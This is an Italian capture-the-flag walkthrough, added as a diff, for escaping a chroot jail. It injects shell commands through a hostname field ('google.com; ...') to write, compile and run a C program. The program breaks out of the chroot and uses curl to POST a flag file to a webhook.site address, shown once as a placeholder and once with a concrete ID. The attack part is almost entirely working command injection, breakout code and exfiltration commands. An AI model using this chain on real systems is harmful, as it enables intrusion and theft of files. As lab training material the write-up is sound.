@@ -1,0 +1,15 @@
+L’esercizio consiste nel fuggire da un ambiente chroot (change root), che è una pratica di sicurezza che isola i processi in un filesystem limitato, impedendo loro di accedere al resto del sistema. La configurazione proposta tenta di limitare l’accesso a comandi critici, ma non implementa correttamente la sicurezza, lasciando spazio a una tecnica di evasione.
+
+Passaggi per completare la challenge:
+
+1) Creazione del file di evasione: Per creare un programma in C che esegua un attacco di chroot escape, inviamo il seguente comando nel campo hostname della richiesta:
+google.com; echo -e "#include <sys/stat.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main(void) {\n    mkdir(\"chroot-dir\", 0755);\n    chroot(\"chroot-dir\");\n    for (int i = 0; i < 1000; i++) {\n        chdir(\"..\");\n    }\n    chroot(\".\");\n    system(\"curl -X POST -d \\\"flag=\$(cat /percorso/assoluto/flag.txt)\\\" https://webhook.site/<ID-UNICO>\");\n    return 0;\n}" > escape.c
+Nota: Sostituisci <ID-UNICO> con il tuo ID webhook.
+Sostituisci /percorso/assoluto/flag.txt con il percorso della flag all’interno del filesystem di chroot.
+2) Compilazione del programma C: Dopo aver creato escape.c, compiliamo il programma usando il comando gcc:
+google.com; gcc escape.c -o escape
+3) Esecuzione dell’exploit: Eseguiamo il binario compilato per completare l’evasione:
+google.com; ./escape
+4) Recupero della flag: La flag viene inviata tramite curl a un URL di webhook personalizzato, da dove potremo visualizzare il contenuto completo della flag.
+
+google.com; echo -e "#include <sys/stat.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main(void) {\n    mkdir(\"chroot-dir\", 0755);\n    chroot(\"chroot-dir\");\n    for (int i = 0; i < 1000; i++) {\n        chdir(\"..\");\n    }\n    chroot(\".\");\n    system(\"curl -X POST -d \\\"flag=\\\$(cat /chroot/home/user/flag.txt)\\\" https://webhook.site/fd7475a6-d240-4679-838a-5c80a2501afc\");\n    return 0;\n}" > escape2.c
